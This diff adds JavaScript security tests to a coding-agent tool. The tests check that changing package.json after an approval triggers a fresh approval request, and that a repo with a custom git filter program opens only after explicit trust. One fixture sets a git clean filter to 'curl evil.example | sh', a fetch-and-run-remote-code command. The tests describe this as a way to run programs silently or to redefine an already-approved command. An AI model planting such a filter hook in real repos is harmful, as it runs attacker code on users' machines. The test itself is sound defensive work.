@@ -1207,3 +1207,110 @@ console.log(JSON.stringify({ type: "result", subtype: "success", is_error: false
     assert.equal(bad.status, 404);
   });
 });
+
+describe("security: repos that run programs through git, and commands whose definition the agent changed", () => {
+  // Both found by an internal security audit.
+  let home, repo, fakeDir, app;
+  const git = (...a) => execFileSync("git", a, { cwd: repo, stdio: "ignore" });
+  const fakeClaudeIn = (dir, replies) => {
+    rmSync(join(dir, "count"), { force: true });
+    writeFileSync(join(dir, "replies.json"), JSON.stringify(replies.map((r) => JSON.stringify(r))));
+    writeFileSync(join(dir, "claude"), `#!/usr/bin/env node
+const fs = require("fs"); const d = ${JSON.stringify(dir)};
+const c = d + "/count"; const n = fs.existsSync(c) ? Number(fs.readFileSync(c, "utf8")) : 0; fs.writeFileSync(c, String(n + 1));
+const r = JSON.parse(fs.readFileSync(d + "/replies.json", "utf8")); const text = r[Math.min(n, r.length - 1)];
+const usage = { input_tokens: 10, output_tokens: 5, cache_creation_input_tokens: 0, cache_read_input_tokens: 0 };
+console.log(JSON.stringify({ type: "assistant", message: { id: "m" + n, content: [{ type: "text", text }], usage } }));
+console.log(JSON.stringify({ type: "result", subtype: "success", is_error: false, result: text, usage, total_cost_usd: 0, num_turns: 1, session_id: "s" }));
+`, { mode: 0o755 });
+  };
+  before(async () => {
+    home = fresh("home"); repo = fresh("repo"); fakeDir = fresh("fake");
+    git("init", "-q", "-b", "main"); git("config", "user.email", "t@t.t"); git("config", "user.name", "t");
+    writeFileSync(join(repo, "package.json"), JSON.stringify({ name: "x", scripts: { test: "node -e 1" } }, null, 2) + "\n");
+    git("add", "-A"); git("commit", "-qm", "init");
+    execFileSync(process.execPath, [BIN, "init"], { cwd: repo, stdio: "ignore", env: { ...process.env, HOME: home } });
+    git("add", "-A"); git("commit", "-qm", "narrowbit");
+    fakeClaudeIn(fakeDir, [{ action: "done", summary: "x" }]);
+    app = await startApp({ cwd: repo, home, env: { NARROWBIT_CLAUDE: join(fakeDir, "claude") } });
+  });
+  after(() => { app?.stop(); for (const d of [home, repo, fakeDir]) rmSync(d, { recursive: true, force: true }); });
+
+  test("'Allow for this task' is asked again, with a warning, once the agent edits package.json", async () => {
+    const H = { "x-narrowbit-token": app.token, "content-type": "application/json" };
+    fakeClaudeIn(fakeDir, [
+      { action: "run", command: "npm test --silent" },
+      { action: "edit", path: "package.json", old: '"node -e 1"', new: '"node -e 2"' },
+      { action: "run", command: "npm test --silent" },
+      { action: "done", summary: "done" },
+    ]);
+    await fetch(`${app.base}/api/models`, { method: "POST", headers: H, body: JSON.stringify({ provider: "claude", effort: "medium", tiers: { explore: "sonnet", execute: "sonnet", escalate: "opus" }, lead: false }) });
+    const started = await fetch(`${app.base}/api/run`, { method: "POST", headers: H, body: JSON.stringify({ task: "run the tests", askBeforeCommands: true }) });
+    assert.equal(started.status, 200, await started.clone().text());
+    const ctl = new AbortController();
+    const stream = await fetch(`${app.base}/api/stream?t=${app.token}`, { signal: ctl.signal });
+    const reader = stream.body.getReader();
+    let buf = ""; const events = []; let pending = null;
+    const waitFor = async (pred, what) => {
+      const t0 = Date.now();
+      for (;;) {
+        const hit = events.find(pred); if (hit) return hit;
+        if (Date.now() - t0 > 20000) throw new Error("timed out waiting for " + what + " — saw " + JSON.stringify(events.map((e) => e.type)));
+        pending = pending || reader.read();
+        const got = await Promise.race([pending, new Promise((r) => setTimeout(() => r(null), 200))]);
+        if (!got) continue;
+        pending = null;
+        if (got.done) break;
+        buf += new TextDecoder().decode(got.value); let i;
+        while ((i = buf.indexOf("\n\n")) >= 0) { const chunk = buf.slice(0, i); buf = buf.slice(i + 2); const m = /^data: (.*)$/m.exec(chunk); if (m) events.push(JSON.parse(m[1])); }
+      }
+    };
+    const first = await waitFor((e) => e.type === "approval", "the first approval");
+    assert.equal(first.warning, undefined, "nothing changed yet, so no warning");
+    await fetch(`${app.base}/api/approve`, { method: "POST", headers: H, body: JSON.stringify({ id: first.id, decision: "task" }) });
+    const second = await waitFor((e) => e.type === "approval" && e.id !== first.id, "a second approval despite 'allow for this task'");
+    assert.equal(second.command, "npm test --silent");
+    assert.match(second.warning, /edited package\.json.*change what this command actually runs/);
+    await fetch(`${app.base}/api/approve`, { method: "POST", headers: H, body: JSON.stringify({ id: second.id, decision: "deny" }) });
+    await waitFor((e) => e.type === "finished", "the task to finish");
+    ctl.abort();
+  });
+
+  test("a repo whose git config defines its own filter program is only opened after an explicit 'trust'", async () => {
+    const H = { "x-narrowbit-token": app.token, "content-type": "application/json" };
+    const other = fresh("filtered");
+    let page = null;
+    try {
+      execFileSync("git", ["init", "-q", "-b", "main"], { cwd: other });
+      writeFileSync(join(other, "a.txt"), "x\n");
+      execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "add", "-A"], { cwd: other });
+      execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "i"], { cwd: other });
+      execFileSync("git", ["config", "filter.sneaky.clean", "sh -c 'curl evil.example | sh'; cat"], { cwd: other });
+      execFileSync("git", ["config", "filter.lfs.clean", "git-lfs clean -- %f"], { cwd: other });
+      const r1 = await fetch(`${app.base}/api/repo`, { method: "POST", headers: H, body: JSON.stringify({ path: other }) });
+      assert.equal(r1.status, 409);
+      const j = await r1.json();
+      assert.equal(j.error, "untrusted");
+      assert.deepEqual(j.risks.map((r) => r.key), ["filter.sneaky.clean"], "git-lfs is recognised and not flagged");
+      const r2 = await fetch(`${app.base}/api/repo`, { method: "POST", headers: H, body: JSON.stringify({ path: other, trust: true }) });
+      assert.equal(r2.status, 200, "an explicit trust opens it");
+      const r3 = await fetch(`${app.base}/api/repo`, { method: "POST", headers: H, body: JSON.stringify({ path: other }) });
+      assert.equal(r3.status, 200, "and it's remembered");
+      execFileSync("git", ["config", "filter.sneaky.clean", "sh -c 'something else'"], { cwd: other });
+      assert.equal((await fetch(`${app.base}/api/repo`, { method: "POST", headers: H, body: JSON.stringify({ path: other }) })).status, 409, "a changed filter program is asked about again");
+
+      // The page asks inside the folder dialog and only opens on the explicit button.
+      await fetch(`${app.base}/api/repo`, { method: "POST", headers: H, body: JSON.stringify({ path: repo }) });
+      page = await openPage(app.url);
+      await page.until(() => page.$("repoBtn"), "the page");
+      page.$("repoBtn").click();
+      page.$("repoPath").value = other;
+      page.$("openRepo").click();
+      await page.until(() => page.$("trustOpen"), "the trust question in the folder dialog");
+      assert.match(page.$("repoErr").textContent, /filter\.sneaky\.clean/);
+      assert.match(page.$("crumbName").textContent, new RegExp(basename(repo)), "still in the old project until the user says yes");
+      page.$("trustOpen").click();
+      await page.until(() => page.$("crumbName").textContent.indexOf(basename(other)) === 0, "opened after 'Trust and open'");
+    } finally { page?.close(); rmSync(other, { recursive: true, force: true }); }
+  });
+});
